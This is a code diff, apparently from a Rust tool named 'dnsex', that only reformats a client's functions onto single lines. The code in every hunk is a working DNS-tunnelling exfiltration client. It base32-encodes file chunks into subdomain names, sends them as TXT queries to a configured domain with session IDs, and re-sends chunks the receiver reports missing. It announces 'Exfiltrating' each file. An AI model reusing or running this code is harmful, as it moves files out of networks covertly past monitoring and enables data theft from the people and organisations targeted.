@@ -61,13 +61,7 @@ impl Client {
         Ok(client)
     }
 
-    async fn send_init(
-        &self,
-        client: &mut AsyncClient,
-        filename: &str,
-        session_id: &str,
-        total_chunks: usize,
-    ) -> Result<(), DnsexError> {
+    async fn send_init(&self, client: &mut AsyncClient, filename: &str, session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
         let init_fqdn = self.build_fqdn(
             &BASE32_NOPAD.encode(filename.as_bytes()),
             total_chunks,
@@ -79,30 +73,13 @@ impl Client {
         Ok(())
     }
 
-    async fn send_data(
-        &self,
-        client: &mut AsyncClient,
-        data: &[u8],
-        session_id: &str,
-        total_chunks: usize,
-    ) -> Result<(), DnsexError> {
+    async fn send_data(&self, client: &mut AsyncClient, data: &[u8], session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
         for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
-            let data_fqdn = self.build_fqdn(
-                &BASE32_NOPAD.encode(chunk),
-                seq,
-                session_id,
-                ChunkFlag::Data as u32,
-            );
+            let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), seq, session_id, ChunkFlag::Data as u32);
 
             if self.config.progress {
                 let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
-                print!(
-                    "\r[{}/{} ({:.2}%)] {}",
-                    seq + 1,
-                    total_chunks,
-                    progress,
-                    data_fqdn
-                );
+                print!("\r[{}/{} ({:.2}%)] {}", seq + 1, total_chunks, progress, data_fqdn);
 
                 let _ = std::io::stdout().flush();
             }
@@ -114,25 +91,14 @@ impl Client {
         Ok(())
     }
 
-    async fn send_fin(
-        &self,
-        client: &mut AsyncClient,
-        session_id: &str,
-        total_chunks: usize,
-        is_directory: bool,
-    ) -> Result<Vec<usize>, DnsexError> {
+    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize, is_directory: bool) -> Result<Vec<usize>, DnsexError> {
         let flags = if is_directory {
             ChunkFlag::Fin as u32 | ChunkFlag::Directory as u32
         } else {
             ChunkFlag::Fin as u32
         };
 
-        let fin_fqdn = self.build_fqdn(
-            &BASE32_NOPAD.encode("EOF".as_bytes()),
-            total_chunks,
-            session_id,
-            flags,
-        );
+        let fin_fqdn = self.build_fqdn(&BASE32_NOPAD.encode("EOF".as_bytes()), total_chunks, session_id, flags);
 
         let responses = self.send_query(client, &fin_fqdn).await?;
         let mut missing: Vec<usize> = Vec::new();
@@ -141,33 +107,19 @@ impl Client {
             if response == "OK" {
                 return Ok(Vec::new());
             } else if let Some(missing_str) = response.strip_prefix("MISSING:") {
-                missing = missing_str
-                    .split(',')
-                    .filter_map(|s| s.parse::<usize>().ok())
-                    .collect();
+                missing = missing_str.split(',').filter_map(|s| s.parse::<usize>().ok()).collect();
             }
         }
 
         Ok(missing)
     }
 
-    async fn send_missing(
-        &self,
-        client: &mut AsyncClient,
-        data: &[u8],
-        session_id: &str,
-        missing: &[usize],
-    ) -> Result<(), DnsexError> {
+    async fn send_missing(&self, client: &mut AsyncClient, data: &[u8], session_id: &str, missing: &[usize]) -> Result<(), DnsexError> {
         let chunks: Vec<&[u8]> = data.chunks(CHUNK_SIZE).collect();
 
         for &seq in missing {
             if seq < chunks.len() {
-                let data_fqdn = self.build_fqdn(
-                    &BASE32_NOPAD.encode(chunks[seq]),
-                    seq,
-                    session_id,
-                    ChunkFlag::Data as u32,
-                );
+                let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunks[seq]), seq, session_id, ChunkFlag::Data as u32);
 
                 self.send_query(client, &data_fqdn).await?;
             }
@@ -180,32 +132,17 @@ impl Client {
         let mut client = self.get_client().await?;
         let session_id = Client::generate_session_id();
         let total_chunks = payload.data.chunks(CHUNK_SIZE).count();
-        let filename = payload
-            .filename
-            .file_name()
-            .unwrap()
-            .to_string_lossy()
-            .to_string();
+        let filename = payload.filename.file_name().unwrap().to_string_lossy().to_string();
 
-        println!(
-            "Exfiltrating {} to {}",
-            payload.filename.to_string_lossy(),
-            self.config.domain
-        );
-
-        self.send_init(&mut client, &filename, &session_id, total_chunks)
-            .await?;
-
-        self.send_data(&mut client, &payload.data, &session_id, total_chunks)
-            .await?;
+        println!("Exfiltrating {} to {}", payload.filename.to_string_lossy(), self.config.domain);
+        self.send_init(&mut client, &filename, &session_id, total_chunks).await?;
+        self.send_data(&mut client, &payload.data, &session_id, total_chunks).await?;
 
         let mut retries = 0;
         const MAX_RETRIES: usize = 5;
 
         loop {
-            let missing = self
-                .send_fin(&mut client, &session_id, total_chunks, payload.is_directory)
-                .await?;
+            let missing = self.send_fin(&mut client, &session_id, total_chunks, payload.is_directory).await?;
 
             if missing.is_empty() {
                 break;
@@ -216,8 +153,7 @@ impl Client {
                 break;
             }
 
-            self.send_missing(&mut client, &payload.data, &session_id, &missing)
-                .await?;
+            self.send_missing(&mut client, &payload.data, &session_id, &missing).await?;
             retries += 1;
         }
 
@@ -225,16 +161,10 @@ impl Client {
         Ok(())
     }
 
-    async fn send_query(
-        &self,
-        client: &mut AsyncClient,
-        fqdn: &str,
-    ) -> Result<Vec<String>, DnsexError> {
+    async fn send_query(&self, client: &mut AsyncClient, fqdn: &str) -> Result<Vec<String>, DnsexError> {
         let domain_name = Name::from_str(fqdn)?;
 
-        let response = client
-            .query(domain_name, DNSClass::IN, RecordType::TXT)
-            .await?;
+        let response = client.query(domain_name, DNSClass::IN, RecordType::TXT).await?;
 
         let mut responses: Vec<String> = Vec::new();
 
